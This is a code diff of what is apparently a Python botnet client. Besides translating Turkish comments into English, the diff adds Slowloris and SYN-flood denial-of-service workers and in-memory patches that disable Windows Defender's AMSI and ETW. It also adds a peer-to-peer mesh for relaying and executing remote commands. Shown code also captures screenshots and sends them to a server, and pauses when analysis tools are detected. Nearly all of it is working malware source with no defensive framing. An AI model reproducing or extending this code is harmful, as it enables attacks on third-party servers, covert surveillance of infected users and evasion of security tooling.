-                # Screenshot al
+                # Take screenshot
                 screenshot = ImageGrab.grab()
                 
-                # Timestamp ile dosya adı oluştur
+                # Create filename with timestamp
                 timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                 filename = f"{self.bot_id}_{timestamp}.png"
                 
-                # Screenshot'ı base64'e çevir
+                # Convert screenshot to base64
                 import io
                 img_buffer = io.BytesIO()
                 screenshot.save(img_buffer, format='PNG')
                 img_data = base64.b64encode(img_buffer.getvalue()).decode('utf-8')
                 
-                # Server'a gönder
+                # Send to server
                 self._send_screenshot_data(filename, img_data)
                 
-                # 10 saniye bekle
+                # Wait 10 seconds
                 time.sleep(10)
                 
             except Exception as e:
@@ -10330,7 +10453,7 @@ if __name__ == "__main__":
                 time.sleep(10)
     
     def _send_screenshot_data(self, filename, img_data):
-        """Screenshot verisini server'a gönder"""
+        """Send screenshot data to server"""
         try:
             if self.current_sock:
                 data = {
@@ -10348,12 +10471,10 @@ if __name__ == "__main__":
             print(f"Screenshot send error: {e}")
     
     def ddos_start(self, target_ip, target_port=80, duration=30, threads=50):
-        """DDoS saldırısını başlat"""
         try:
             if self.ddos_active:
                 return "DDoS attack already active"
             
-            # Parametreleri validate et
             if not target_ip or not isinstance(target_port, int):
                 return "Invalid target parameters"
             
@@ -10369,7 +10490,7 @@ if __name__ == "__main__":
             self.ddos_duration = duration
             self.ddos_threads_count = threads
             
-            # DDoS thread'lerini başlat
+            # Start DDoS threads
             for i in range(threads):
                 thread = threading.Thread(target=self._ddos_worker, args=(target_ip, target_port, duration), daemon=True)
                 thread.start()
@@ -10381,7 +10502,6 @@ if __name__ == "__main__":
             return f"DDoS start error: {e}"
     
     def ddos_stop(self):
-        """DDoS saldırısını durdur"""
         try:
             if not self.ddos_active:
                 return "No active DDoS attack"
@@ -10424,9 +10544,503 @@ if __name__ == "__main__":
             while self.ddos_active and (time.time() - start_time) < duration:
                 try:
                     requests.get(target_url, timeout=1)
-                    time.sleep(0.01)  # 10ms delay
+                    time.sleep(0.03)  # 10ms delay
                 except:
                     pass
         except:
             pass
+    
+    def _slowloris_worker(self, target_ip, target_port, duration):
+        """Slowloris attack - keeps connections open with incomplete HTTP headers"""
+        import random
+        start_time = time.time()
+
+        try:
+            while self.ddos_active and (time.time() - start_time) < duration:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(10)
+                    sock.connect((target_ip, target_port))
+
+                    # Send partial HTTP request
+                    http_request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n"
+                    sock.send(http_request.encode())
+
+                    # Keep sending incomplete headers to maintain connection
+                    while (time.time() - start_time) < duration and self.ddos_active:
+                        try:
+                            # Send header line slowly
+                            header_line = f"X-a: {random.randint(1, 5000)}\r\n"
+                            sock.send(header_line.encode())
+                            time.sleep(random.uniform(5, 15))  # Wait between headers
+                        except:
+                            break
+                    
+                    sock.close()
+                except Exception as e:
+                    pass
+
+                time.sleep(0.1)
+
+        except Exception as e:
+            pass
+
+    def _syn_flood_worker(self, target_ip, target_port, duration):
+        """SYN Flood attack - sends SYN packets without completing handshake"""
+        start_time = time.time()
+        
+        try:
+            while self.ddos_active and (time.time() - start_time) < duration:
+                try:
+                    # Create socket for SYN packets
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(1)
+                    
+                    # Set TCP_NODELAY for faster sending
+                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                    
+                    # Start connection (sends SYN)
+                    sock.connect((target_ip, target_port))
+                    
+                    # Immediately close (never send ACK - incomplete handshake)
+                    sock.close()
+                    
+                except:
+                    # Connection refused/timeout means SYN was sent but not ACKed
+                    pass
+                
+        except Exception as e:
+            pass
+    
+    def _slowloris_start(self, target_ip, target_port, duration, connections):
+        """Start Slowloris attack with specified number of connections"""
+        try:
+            if self.ddos_active:
+                return "DDoS attack already active"
+            
+            if not target_ip:
+                return "Invalid target parameters"
+            
+            if duration > 300:
+                duration = 300
+            
+            if connections > 500:
+                connections = 500
+            
+            self.ddos_active = True
+            
+            # Start Slowloris connections
+            for i in range(connections):
+                thread = threading.Thread(
+                    target=self._slowloris_worker, 
+                    args=(target_ip, target_port, duration), 
+                    daemon=True
+                )
+                thread.start()
+                self.ddos_threads.append(thread)
+            
+            return f"Slowloris attack started: {target_ip}:{target_port} | Duration: {duration}s | Connections: {connections}"
+            
+        except Exception as e:
+            return f"Slowloris start error: {e}"
+    
+    def _syn_flood_start(self, target_ip, target_port, duration, threads):
+        """Start SYN Flood attack"""
+        try:
+            if self.ddos_active:
+                return "DDoS attack already active"
+            
+            if not target_ip:
+                return "Invalid target parameters"
+            
+            if duration > 300:
+                duration = 300
+            
+            if threads > 200:
+                threads = 200
+            
+            self.ddos_active = True
+            
+            # Start SYN flood threads
+            for i in range(threads):
+                thread = threading.Thread(
+                    target=self._syn_flood_worker, 
+                    args=(target_ip, target_port, duration), 
+                    daemon=True
+                )
+                thread.start()
+                self.ddos_threads.append(thread)
+            
+            return f"SYN Flood attack started: {target_ip}:{target_port} | Duration: {duration}s | Threads: {threads}"
+            
+        except Exception as e:
+            return f"SYN Flood start error: {e}"
+    
+    
+    def _enable_windows_defender_bypass(self):
+        """Windows Defender AMSI Bypass - Auto-activates on bot startup"""
+        try:
+            if self.platform != 'windows':
+                return {'status': 'skipped', 'message': 'Windows only feature'}
+            
+            print(f"\033[94m[*] Auto-enabling Windows Defender AMSI bypass...\033[0m")
+            
+            # Method 1: AMSI.dll patch
+            result1 = self._amsi_patch_bypass()
+            
+            # Method 2: ETW patching
+            result2 = self._etw_patch_bypass()
+            
+            success = result1 or result2
+            
+            if success:
+                self.stealth_technologies['windows_defender_bypass'] = True
+                print(f"\033[92m[+] Windows Defender bypass ACTIVE\033[0m")
+            
+            return {'status': 'success' if success else 'failed', 'enabled': success}
+            
+        except Exception as e:
+            print(f"\033[91m[!] Windows Defender bypass error: {e}\033[0m")
+            return {'status': 'error', 'message': str(e)}
+    
+    def _amsi_patch_bypass(self):
+        """AMSI.dll AmsiScanBuffer patch"""
+        try:
+            import ctypes
+            
+            amsi_dll = ctypes.windll.amsi
+            amsi_scan_buffer = amsi_dll.AmsiScanBuffer
+            
+            # Patch: xor eax, eax; ret
+            patch = bytes([0x31, 0xC0, 0xC3])
+            
+            VirtualProtect = ctypes.windll.kernel32.VirtualProtect
+            old_protect = ctypes.c_ulong(0)
+            PAGE_EXECUTE_READWRITE = 0x40
+            
+            result = VirtualProtect(amsi_scan_buffer, len(patch), PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect))
+            if not result:
+                return False
+            
+            ctypes.memmove(amsi_scan_buffer, patch, len(patch))
+            VirtualProtect(amsi_scan_buffer, len(patch), old_protect.value, ctypes.byref(old_protect))
+            
+            print(f"\033[92m[+] AMSI patch applied\033[0m")
+            return True
+            
+        except Exception as e:
+            print(f"\033[93m[!] AMSI patch failed: {e}\033[0m")
+            return False
+    
+    def _etw_patch_bypass(self):
+        """ETW bypass"""
+        try:
+            import ctypes
+            
+            ntdll = ctypes.windll.ntdll
+            
+            try:
+                etw_event_write = ntdll.EtwEventWrite
+            except:
+                return False
+            
+            patch = bytes([0xC2, 0x14, 0x00])  # ret 0x14
+            
+            VirtualProtect = ctypes.windll.kernel32.VirtualProtect
+            old_protect = ctypes.c_ulong(0)
+            PAGE_EXECUTE_READWRITE = 0x40
+            
+            result = VirtualProtect(etw_event_write, len(patch), PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect))
+            if not result:
+                return False
+            
+            ctypes.memmove(etw_event_write, patch, len(patch))
+            VirtualProtect(etw_event_write, len(patch), old_protect.value, ctypes.byref(old_protect))
+            
+            print(f"\033[92m[+] ETW patch applied\033[0m")
+            return True
+            
+        except Exception as e:
+            print(f"\033[93m[!] ETW patch failed: {e}\033[0m")
+            return False
+    # === NEW P2P SYSTEM IMPLEMENTATIONS ===
+    
+    def _init_ai_p2p_components(self):
+        """Initialize P2P components - peer registry, relay cache, command queue"""
+        self.peer_registry = {}  # {peer_id: {'ip': ip, 'port': port, 'last_seen': timestamp, 'status': 'active'}}
+        self.peer_heartbeat_interval = 30
+        self.p2p_command_queue = []
+        self.p2p_relay_cache = {}  # For storing commands to relay
+        self.lan_broadcast_port = 55555
+        self.last_lan_broadcast = 0
+        self.lan_broadcast_interval = 60
+        print("\033[94m[*] P2P components initialized\033[0m")
+    
+    def _ai_p2p_loop(self):
+        """Main P2P loop with peer discovery and heartbeat"""
+        while self.p2p_active and self.running:
+            try:
+                # Wireshark check
+                if self.check_for_analysis_tools():
+                    time.sleep(self.analysis_wait_time)
+                    continue
+                
+                # LAN broadcast discovery
+                current_time = time.time()
+                if current_time - self.last_lan_broadcast > self.lan_broadcast_interval:
+                    self.last_lan_broadcast = current_time
+                    self._lan_broadcast_discovery()
+                
+                # Accept incoming connections
+                try:
+                    conn, addr = self.p2p_listener.accept()
+                    threading.Thread(target=self._handle_p2p_connection, args=(conn, addr), daemon=True).start()
+                except socket.timeout:
+                    pass
+                
+                # Peer heartbeat and cleanup
+                self._peer_heartbeat_check()
+                
+                # Process command relay
+                self._process_p2p_command_queue()
+                
+                time.sleep(1)
+                
+            except Exception as e:
+                print(f"[!] P2P loop error: {e}")
+                time.sleep(5)
+    
+    def _start_ai_peer_discovery(self):
+        """Start peer discovery with LAN broadcast and mesh integration"""
+        threading.Thread(target=self._lan_discovery_listener, daemon=True).start()
+        threading.Thread(target=self._mesh_peer_discovery, daemon=True).start()
+        print("\033[94m[*] Peer discovery started\033[0m")
+    
+    def _lan_broadcast_discovery(self):
+        """Broadcast presence on LAN for peer discovery"""
+        try:
+            import struct
+            # Create UDP broadcast socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+            sock.settimeout(2)
+            
+            # Discovery message
+            discovery_msg = {
+                'action': 'peer_discovery',
+                'bot_id': self.bot_id,
+                'p2p_port': self.p2p_port,
+                'timestamp': time.time()
+            }
+            
+            # Broadcast to common subnets
+            subnets = ['192.168.1.', '192.168.0.', '10.0.0.', '172.16.0.']
+            for subnet in subnets:
+                for i in range(1, 255):
+                    try:
+                        addr = f"{subnet}{i}"
+                        sock.sendto(self.encrypt_data(json.dumps(discovery_msg)), (addr, self.lan_broadcast_port))
+                    except:
+                        pass
+            
+            sock.close()
+        except Exception as e:
+            print(f"[!] LAN broadcast error: {e}")
+    
+    def _lan_discovery_listener(self):
+        """Listen for LAN broadcast discovery messages"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.bind(('0.0.0.0', self.lan_broadcast_port))
+            sock.settimeout(5)
+            
+            while self.p2p_active:
+                try:
+                    data, addr = sock.recvfrom(1024)
+                    if data:
+                        msg = json.loads(self.decrypt_data(data))
+                        if msg.get('action') == 'peer_discovery':
+                            peer_id = msg.get('bot_id')
+                            peer_port = msg.get('p2p_port')
+                            
+                            if peer_id != self.bot_id:
+                                # Add to known peers
+                                peer_info = (addr[0], peer_port)
+                                self.known_peers.add(peer_info)
+                                self.peer_registry[peer_id] = {
+                                    'ip': addr[0],
+                                    'port': peer_port,
+                                    'last_seen': time.time(),
+                                    'status': 'active'
+                                }
+                                print(f"[+] Peer discovered via LAN: {peer_id} at {addr[0]}:{peer_port}")
+                                
+                                # Send acknowledgment
+                                ack_msg = {
+                                    'action': 'peer_discovery_ack',
+                                    'bot_id': self.bot_id,
+                                    'p2p_port': self.p2p_port
+                                }
+                                sock.sendto(self.encrypt_data(json.dumps(ack_msg)), (addr[0], self.lan_broadcast_port))
+                except socket.timeout:
+                    continue
+                except Exception as e:
+                    pass
+            
+            sock.close()
+        except Exception as e:
+            print(f"[!] LAN listener error: {e}")
+    
+    def _mesh_peer_discovery(self):
+        """Discover peers through existing peers (mesh network)"""
+        while self.p2p_active:
+            try:
+                if self.known_peers:
+                    for peer in list(self.known_peers):
+                        try:
+                            ip, port = peer
+                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            sock.settimeout(5)
+                            sock.connect((ip, port))
+                            
+                            # Request peer list
+                            msg = {
+                                'action': 'get_peers',
+                                'bot_id': self.bot_id,
+                                'known_peers': [(p[0], p[1]) for p in self.known_peers]
+                            }
+                            sock.sendall(self.encrypt_data(json.dumps(msg)))
+                            
+                            response = sock.recv(4096)
+                            if response:
+                                resp_data = json.loads(self.decrypt_data(response))
+                                if resp_data.get('action') == 'peer_list':
+                                    new_peers = resp_data.get('peers', [])
+                                    for new_peer in new_peers:
+                                        peer_tuple = (new_peer['ip'], new_peer['port'])
+                                        if peer_tuple not in self.known_peers:
+                                            self.known_peers.add(peer_tuple)
+                                            print(f"[+] New peer from mesh: {new_peer['ip']}:{new_peer['port']}")
+                            
+                            sock.close()
+                        except:
+                            pass
+                
+                time.sleep(120)  # Every 2 minutes
+            except Exception as e:
+                time.sleep(60)
+    
+    def _peer_heartbeat_check(self):
+        """Check peer status and remove inactive peers"""
+        current_time = time.time()
+        inactive_peers = []
+        
+        for peer_id, peer_info in list(self.peer_registry.items()):
+            if current_time - peer_info['last_seen'] > self.peer_heartbeat_interval * 3:
+                inactive_peers.append(peer_id)
+        
+        for peer_id in inactive_peers:
+            del self.peer_registry[peer_id]
+            print(f"[-] Peer removed (inactive): {peer_id}")
+    
+    def _process_p2p_command_queue(self):
+        """Process commands in P2P queue (relay to peers or execute)"""
+        while self.p2p_command_queue:
+            try:
+                cmd_item = self.p2p_command_queue.pop(0)
+                command = cmd_item.get('command')
+                target_bot = cmd_item.get('target_bot')
+                source_bot = cmd_item.get('source_bot')
+                
+                if target_bot == self.bot_id:
+                    # Execute locally
+                    print(f"[P2P] Executing command from {source_bot}: {command}")
+                    output = self.execute_command(command)
+                    
+                    # Send response back through P2P
+                    self._send_p2p_command_response(source_bot, command, output)
+                else:
+                    # Relay to target peer
+                    self._relay_command_to_peer(target_bot, cmd_item)
+            except Exception as e:
+                print(f"[!] P2P command queue error: {e}")
+    
+    def _relay_command_to_peer(self, target_bot, cmd_item):
+        """Relay command to target peer through P2P network"""
+        try:
+            # Find peer in registry
+            if target_bot in self.peer_registry:
+                peer_info = self.peer_registry[target_bot]
+                ip, port = peer_info['ip'], peer_info['port']
+                
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(10)
+                sock.connect((ip, port))
+                
+                relay_msg = {
+                    'action': 'relay_command',
+                    'command_data': cmd_item
+                }
+                sock.sendall(self.encrypt_data(json.dumps(relay_msg)))
+                sock.close()
+                print(f"[P2P] Command relayed to {target_bot}")
+            else:
+                # Broadcast to all peers (flood routing)
+                for peer in self.known_peers:
+                    try:
+                        ip, port = peer
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(5)
+                        sock.connect((ip, port))
+                        
+                        relay_msg = {
+                            'action': 'relay_command',
+                            'target_bot': target_bot,
+                            'command_data': cmd_item,
+                            'ttl': cmd_item.get('ttl', 5) - 1  # Decrease TTL
+                        }
+                        
+                        if relay_msg['ttl'] > 0:
+                            sock.sendall(self.encrypt_data(json.dumps(relay_msg)))
+                        
+                        sock.close()
+                    except:
+                        pass
+        except Exception as e:
+            print(f"[!] Relay error: {e}")
+    
+    def _send_p2p_command_response(self, target_bot, command, output):
+        """Send command response back to originating bot"""
+        try:
+            if target_bot in self.peer_registry:
+                peer_info = self.peer_registry[target_bot]
+                ip, port = peer_info['ip'], peer_info['port']
+                
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(10)
+                sock.connect((ip, port))
+                
+                response_msg = {
+                    'action': 'command_response',
+                    'source_bot': self.bot_id,
+                    'command': command,
+                    'output': output
+                }
+                sock.sendall(self.encrypt_data(json.dumps(response_msg)))
+                sock.close()
+        except Exception as e:
+            print(f"[!] Response send error: {e}")
+    
+    def send_command_via_p2p(self, target_bot, command):
+        """Public method to send command through P2P network"""
+        cmd_item = {
+            'command': command,
+            'target_bot': target_bot,
+            'source_bot': self.bot_id,
+            'timestamp': time.time(),
+            'ttl': 5  # Time-to-live for flood routing
+        }
+        self.p2p_command_queue.append(cmd_item)
+        return f"Command queued for P2P relay to {target_bot}"
     
